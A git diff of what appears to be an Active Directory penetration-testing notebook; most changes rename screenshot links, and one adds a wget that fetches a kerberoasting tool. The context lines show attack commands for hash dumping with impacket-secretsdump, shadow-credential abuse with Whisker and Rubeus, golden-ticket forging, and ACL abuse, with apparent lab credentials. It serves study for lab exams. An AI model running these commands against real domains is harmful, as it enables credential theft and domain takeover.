@@ -532,7 +532,7 @@ runas /user:corp\jen powershell.exe
 * Add target DC and generic domain to /etc/hosts
   *
 
-      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
@@ -619,7 +619,7 @@ runas /user:corp\jen powershell.exe
 * Can add new access rights like GenericAll, GenericWrite, or even DCSync
 *
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 * Adding GenericAll rights:
   *   ```powershell
       # Might need to migrate to sqlsvc process using metasploit
@@ -639,7 +639,7 @@ runas /user:corp\jen powershell.exe
 
 
 
-OR.. ![](<../.gitbook/assets/image (1) (1).png>)
+OR.. ![](<../.gitbook/assets/image (1) (1) (1).png>)
 
 ```powershell
 #Current user is svc-alfresco
@@ -678,6 +678,7 @@ Set-DomainObject -Identity SHAUN.BLAKE -Set @{'scriptpath'='\\192.168.45.218\sha
 
 * Able to set a service principal name and kerberoast that account
   *   ```powershell
+      wget https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py
       ./targetedKerberoast.py --dc-ip '192.168.170.70' -v -d 'prod.corp1.com' -u 'offsec' -p 'lab'
       ```
 
@@ -697,7 +698,7 @@ Set-DomainObject -Identity SHAUN.BLAKE -Set @{'scriptpath'='\\192.168.45.218\sha
 
 OR USE [RBCD FROM KALI ATTACKER MACHINE!!](lateral-movement.md#resource-based-constrained-delegation)
 
-![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 * Enumerating permissions assigned to current user
   *   ```powershell
@@ -830,10 +831,10 @@ nslookup appsrv01
     * OR Krbrelayx attack on unconstrained delegation
       *
 
-          <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+          <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
         *   ```powershell
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
             ```
@@ -917,7 +918,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
@@ -939,7 +940,7 @@ nslookup appsrv01
 
     * Enumerate the user logged in to MSSQL --> logged in as the domain admin
 
-    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -958,7 +959,7 @@ nslookup appsrv01
 
 ## Exploitation 3
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 * Obtain a Ticket Granting Ticket (TGT) for the Service Account
   *   ```powershell
@@ -1228,7 +1229,7 @@ setspn -T corp2.com -Q MSSQLSvc/*
 
 <summary>Exploiting AddKeyCredentialLink</summary>
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Using [https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whisker)
 
@@ -1236,18 +1237,18 @@ Using [https://github.com/eladshamir/Whisker](https://github.com/eladshamir/Whis
 Whisker.exe add /target:ZPH-SVRMGMT1$
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:MIIJ… /password:"zCixoq4fEBQBRvvE" /domain:zsm.local /dc:ZPH-SVRDC01.zsm.local /getcredentials /show /ptt
 klist
 ```
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 User's NTLM hash might be displayed:
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 </details>
 
@@ -1281,7 +1282,7 @@ Kerberos::golden /user:Administrator /domain:internal.zsm.local /sid:S-1-5-21-30
 # kerberos::golden /user:<USERNAME> /domain:<DOMAIN_NAME> /sid:<ORIGINAL_DOMAIN_SID> /sids:<PARENT_DOMAIN_SID>-519 /rc4:<KRB_TGT_RC4_KEY> /service:<KERBEROS_SERVICE_SP> /target:<TARGET_REALM> /ticket:<OUTPUT_TICKET_FILENAME>
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 dir \\ZPH-SVRDC01.zsm.local\c$
